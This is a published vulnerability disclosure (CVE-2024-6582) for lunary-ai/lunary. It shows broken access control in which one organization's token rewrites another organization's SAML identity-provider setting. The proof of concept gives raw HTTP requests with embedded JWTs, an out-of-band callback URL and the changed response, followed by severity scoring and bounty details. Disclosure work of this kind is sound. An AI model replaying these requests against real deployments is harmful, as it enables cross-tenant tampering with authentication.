@@ -1,0 +1,85 @@
+Title: Broken access control in lunary-ai/lunary
+
+Proof of Concept: 
+With a token of the organization A (5b7f1774-eec4-4da3-a3d0-a346f43a625d)
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxODI2ODlhMC0xYTAxLTRmOGUtOTRjMy1hNzQyMzk1MzdiNWEiLCJlbWFpbCI6ImJsYWxhMjIyQHlvcG1haWwuY29tIiwib3JnSWQiOiI1YjdmMTc3NC1lZWM0LTRkYTMtYTNkMC1hMzQ2ZjQzYTYyNWQiLCJleHAiOjE3MTg4NTA3MTksImlhdCI6MTcxNjI1ODcxOSwibmJmIjoxNzE2MjU4NzE5fQ.0PHOc4pSfKue2xAS5wUE0D5FsCx8kD7MFvFUM4ADDcM
+
+Use this token to update the IDP of organization B (ee71a663-fe70-45c7-b3b1-b1f8f63e4ebb).
+
+POST /auth/saml/ee71a663-fe70-45c7-b3b1-b1f8f63e4ebb/download-idp-xml HTTP/1.1
+Host: localhost:3333
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost:8080/
+Origin: http://localhost:8080
+DNT: 1
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxODI2ODlhMC0xYTAxLTRmOGUtOTRjMy1hNzQyMzk1MzdiNWEiLCJlbWFpbCI6ImJsYWxhMjIyQHlvcG1haWwuY29tIiwib3JnSWQiOiI1YjdmMTc3NC1lZWM0LTRkYTMtYTNkMC1hMzQ2ZjQzYTYyNWQiLCJleHAiOjE3MTg4NTA3MTksImlhdCI6MTcxNjI1ODcxOSwibmJmIjoxNzE2MjU4NzE5fQ.0PHOc4pSfKue2xAS5wUE0D5FsCx8kD7MFvFUM4ADDcM
+Sec-GPC: 1
+Connection: close
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Priority: u=4
+Content-Type: application/json
+Content-Length: 69
+
+{"content":"http://402l4fsm5pifq8rtvsw97bn37udl1cp1.oastify.com"}
+
+Access the /v1/users/me/org endpoint of organization B. The samlIdpXml value of this organization has been changed.
+
+Request:
+
+GET /v1/users/me/org HTTP/1.1
+Host: localhost:3333
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost:8080/
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI3ZWM2YmUzZC0wNGY1LTQ1MjQtYTM4MC03MzFkOWIxZGMxOTEiLCJlbWFpbCI6InRlc3RlcjJAZ21haWwuY29tIiwib3JnSWQiOiJlZTcxYTY2My1mZTcwLTQ1YzctYjNiMS1iMWY4ZjYzZTRlYmIiLCJleHAiOjE3MTg5MDkyNDUsImlhdCI6MTcxNjMxNzI0NSwibmJmIjoxNzE2MzE3MjQ1fQ.ZmIHMC5hIRtGgOIkZfCiAiEiA2fuZNJLRCUAJ_rH82M
+Origin: http://localhost:8080
+Connection: close
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+X-PwnFox-Color: blue
+Priority: u=4
+
+Response:
+
+HTTP/1.1 200 OK
+Vary: Origin
+Access-Control-Allow-Origin: http://localhost:8080
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 721
+Date: Thu, 23 May 2024 10:29:39 GMT
+Connection: close
+
+{"id":"ee71a663-fe70-45c7-b3b1-b1f8f63e4ebb","createdAt":"2024-05-21T18:46:58.186Z","name":"admin2's Org","plan":"team","playAllowance":2,"stripeCustomer":null,"stripeSubscription":null,"limited":false,"planPeriod":"monthly","canceled":false,"samlIdpXml":"<html><body>9wmgz5v5i0ltdwrt93u8kczjjgjgz</body></html>","samlEnabled":false,"radarAllowance":500,"evalAllowance":500,"users":[{"id":"7ec6be3d-04f5-4524-a380-731d9b1dc191","createdAt":"2024-05-21T18:46:58.186Z","email":"tester2@gmail.com","orgId":"ee71a663-fe70-45c7-b3b1-b1f8f63e4ebb",
+...
+
+Impact: 
+
+
+CVE ID: CVE-2024-6582
+Status: (published)
+Vulnerability Type: CWE-287: Improper Authentication
+Severity: Medium (6.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: Low
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Npm
+Affected Version: Latest
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $90
+Fix Bounty: $18.75
